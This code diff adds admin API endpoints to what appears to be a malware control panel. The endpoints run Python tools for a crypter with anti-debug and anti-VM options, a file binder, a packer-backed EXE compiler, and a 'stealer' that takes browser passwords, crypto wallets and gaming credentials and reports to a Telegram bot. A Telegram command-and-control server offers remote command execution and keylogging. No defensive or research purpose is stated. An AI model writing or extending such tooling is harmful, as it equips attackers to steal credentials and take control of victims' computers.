@@ -1655,6 +1655,221 @@ if __name__ == "__main__":
     }
   });
 
+  // Advanced Crypter endpoint
+  app.post("/api/admin/advanced-crypter", requireAdmin, async (req, res) => {
+    try {
+      const { inputFile, crypterOptions } = req.body;
+      
+      const cryptCommand = [
+        'python3',
+        'python_tools/elite_toolkit.py',
+        '--crypter',
+        '--input', inputFile,
+        '--output', `crypted_${Date.now()}.exe`,
+        '--layers', crypterOptions.layers || '3',
+        '--anti-debug', crypterOptions.antiDebug ? 'true' : 'false',
+        '--anti-vm', crypterOptions.antiVM ? 'true' : 'false'
+      ];
+
+      const cryptProcess = spawn(cryptCommand[0], cryptCommand.slice(1));
+      
+      cryptProcess.on('exit', (code) => {
+        if (code === 0) {
+          res.json({
+            success: true,
+            message: 'File successfully crypted',
+            downloadUrl: `/download/crypted_${Date.now()}.exe`
+          });
+        } else {
+          res.status(500).json({ error: 'Crypter process failed' });
+        }
+      });
+
+    } catch (error) {
+      console.error('Crypter error:', error);
+      res.status(500).json({ error: 'Crypter failed' });
+    }
+  });
+
+  // File Binder endpoint
+  app.post("/api/admin/file-binder", requireAdmin, async (req, res) => {
+    try {
+      const { files, binderOptions } = req.body;
+      
+      const bindCommand = [
+        'python3',
+        'python_tools/elite_toolkit.py',
+        '--binder',
+        '--files', files.join(','),
+        '--output', `bound_${Date.now()}.exe`,
+        '--execution', binderOptions.execution || 'sequential'
+      ];
+
+      const bindProcess = spawn(bindCommand[0], bindCommand.slice(1));
+      
+      bindProcess.on('exit', (code) => {
+        if (code === 0) {
+          res.json({
+            success: true,
+            message: 'Files successfully bound',
+            downloadUrl: `/download/bound_${Date.now()}.exe`
+          });
+        } else {
+          res.status(500).json({ error: 'Binder process failed' });
+        }
+      });
+
+    } catch (error) {
+      console.error('Binder error:', error);
+      res.status(500).json({ error: 'Binder failed' });
+    }
+  });
+
+  // Advanced Data Stealer deployment
+  app.post("/api/admin/deploy-stealer", requireAdmin, async (req, res) => {
+    try {
+      const { telegramConfig, stealerOptions } = req.body;
+      
+      const stealerCommand = [
+        'python3',
+        'python_tools/elite_toolkit.py',
+        '--stealer',
+        '--telegram-token', telegramConfig.botToken,
+        '--chat-id', telegramConfig.chatId,
+        '--comprehensive', 'true',
+        '--zip-output', 'true',
+        '--browsers', 'all',
+        '--crypto-wallets', 'true',
+        '--gaming-platforms', 'true'
+      ];
+
+      const stealerProcess = spawn(stealerCommand[0], stealerCommand.slice(1));
+      
+      stealerProcess.on('exit', (code) => {
+        if (code === 0) {
+          res.json({
+            success: true,
+            message: 'Stealer deployed successfully',
+            telegramIntegration: 'Active',
+            features: [
+              'Browser password extraction',
+              'Cryptocurrency wallet detection',
+              'Gaming platform credentials',
+              'System information gathering',
+              'ZIP archive creation',
+              'Telegram reporting'
+            ]
+          });
+        } else {
+          res.status(500).json({ error: 'Stealer deployment failed' });
+        }
+      });
+
+    } catch (error) {
+      console.error('Stealer deployment error:', error);
+      res.status(500).json({ error: 'Stealer deployment failed' });
+    }
+  });
+
+  // Comprehensive EXE compilation endpoint
+  app.post("/api/admin/compile-to-exe", requireAdmin, async (req, res) => {
+    try {
+      const { scriptPath, compilerOptions } = req.body;
+      
+      const compileCommand = [
+        'python3',
+        'python_tools/elite_toolkit.py',
+        '--compile',
+        '--input', scriptPath,
+        '--output', `compiled_${Date.now()}.exe`,
+        '--onefile', 'true',
+        '--windowed', compilerOptions.windowed || 'true',
+        '--upx', compilerOptions.upx || 'true',
+        '--hidden-imports', 'requests,cryptography,pyautogui,psutil'
+      ];
+
+      const compileProcess = spawn(compileCommand[0], compileCommand.slice(1));
+      
+      let output = '';
+      compileProcess.stdout?.on('data', (data) => {
+        output += data.toString();
+      });
+
+      compileProcess.on('exit', (code) => {
+        if (code === 0) {
+          res.json({
+            success: true,
+            message: 'Script compiled to EXE successfully',
+            downloadUrl: `/download/compiled_${Date.now()}.exe`,
+            compilationLog: output,
+            portable: true,
+            standalone: true
+          });
+        } else {
+          res.status(500).json({ 
+            error: 'Compilation failed',
+            log: output
+          });
+        }
+      });
+
+    } catch (error) {
+      console.error('Compilation error:', error);
+      res.status(500).json({ error: 'Compilation failed' });
+    }
+  });
+
+  // Telegram C2 setup endpoint
+  app.post("/api/admin/setup-telegram-c2", requireAdmin, async (req, res) => {
+    try {
+      const { botToken, chatId, c2Options } = req.body;
+      
+      // Store Telegram configuration
+      await storage.createAnalytics({
+        metric: 'telegram_c2_config',
+        value: JSON.stringify({
+          botToken: botToken.substring(0, 10) + '...',
+          chatId,
+          c2Options,
+          timestamp: new Date().toISOString()
+        })
+      });
+
+      const c2Command = [
+        'python3',
+        'python_tools/millennium_rat_toolkit.py',
+        '--telegram-c2',
+        '--bot-token', botToken,
+        '--chat-id', chatId,
+        '--port', c2Options.port || '8888'
+      ];
+
+      const c2Process = spawn(c2Command[0], c2Command.slice(1), {
+        detached: true,
+        stdio: 'pipe'
+      });
+
+      res.json({
+        success: true,
+        message: 'Telegram C2 server started',
+        botToken: botToken.substring(0, 10) + '...',
+        chatId,
+        capabilities: [
+          'Remote command execution',
+          'File transfer',
+          'Screenshot capture',
+          'Keylogger control',
+          'System monitoring',
+          'Real-time notifications'
+        ]
+      });
+
+    } catch (error) {
+      console.error('Telegram C2 setup error:', error);
+      res.status(500).json({ error: 'Telegram C2 setup failed' });
+    }
+  });
+
   // Download endpoint for crypted files
   app.get("/download/:filename", (req, res) => {
     try {
